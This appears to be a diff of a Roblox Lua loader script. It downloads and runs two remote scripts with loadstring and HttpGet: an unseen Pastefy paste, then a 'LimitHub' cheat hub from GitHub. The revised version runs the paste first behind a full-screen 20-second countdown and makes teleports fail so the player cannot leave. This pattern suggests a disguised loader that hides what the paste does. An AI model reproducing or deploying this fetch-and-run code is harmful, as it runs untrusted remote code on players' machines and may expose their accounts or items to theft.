@@ -1,54 +1,60 @@
--- Loader.lua — Pastefy first → Loading Screen → LimitHub
-
--- 1. Run Pastefy script first
-local success1, err1 = pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
+-- Step 1: Run Pastefy first
+local pastefyLoaded = false
+local pastefySuccess, pastefyError = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw", true))()
+    pastefyLoaded = true
 end)
-if not success1 then
-    warn("[ERROR] Failed to load Pastefy script:", err1)
+
+if not pastefySuccess then
+    warn("[ERROR] Failed to load Pastefy script:", pastefyError)
 end
 
--- 2. Create 20-second loading screen
-local player = game:GetService("Players").LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+-- Step 2: Create loading screen (even if Pastefy fails, still shows)
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
 
-local sg = Instance.new("ScreenGui")
-sg.Name = "GaG_Loader"
-sg.ResetOnSpawn = false
-sg.IgnoreGuiInset = true
-sg.Parent = playerGui
+ScreenGui.Name = "LoadingScreen"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-local frame = Instance.new("Frame")
-frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-frame.Size = UDim2.new(0, 400, 0, 150)
-frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-frame.BorderSizePixel = 0
-frame.Parent = sg
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.Position = UDim2.new(0, 0, 0, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.Parent = ScreenGui
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = frame
+TextLabel.Parent = Frame
+TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 24
+TextLabel.Font = Enum.Font.SourceSansBold
 
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(1, 0, 1, 0)
-label.BackgroundTransparency = 1
-label.Text = "Loading... Please Wait"
-label.TextScaled = true
-label.Font = Enum.Font.GothamBold
-label.TextColor3 = Color3.fromRGB(255, 255, 255)
-label.Parent = frame
+-- Prevent leaving during loading
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+LocalPlayer.OnTeleport = function(State)
+    if State == Enum.TeleportState.Started then
+        return Enum.TeleportState.Failed
+    end
+end
 
--- 3. Wait for 20 seconds
-task.wait(20)
+-- Countdown for 20 seconds
+for i = 20, 1, -1 do
+    TextLabel.Text = "Loading... " .. i .. "s remaining"
+    task.wait(1)
+end
 
 -- Remove loading screen
-sg:Destroy()
+ScreenGui:Destroy()
 
--- 4. Run LimitHub after loading
-local success2, err2 = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
-end)
-if not success2 then
-    warn("[ERROR] Failed to load LimitHub:", err2)
+-- Step 3: Run LimitHub only if Pastefy worked
+if pastefyLoaded then
+    local limitHubSuccess, limitHubError = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua", true))()
+    end)
+    if not limitHubSuccess then
+        warn("[ERROR] Failed to load LimitHub script:", limitHubError)
+    end
+else
+    warn("[STOPPED] Pastefy failed, not loading LimitHub.")
 end
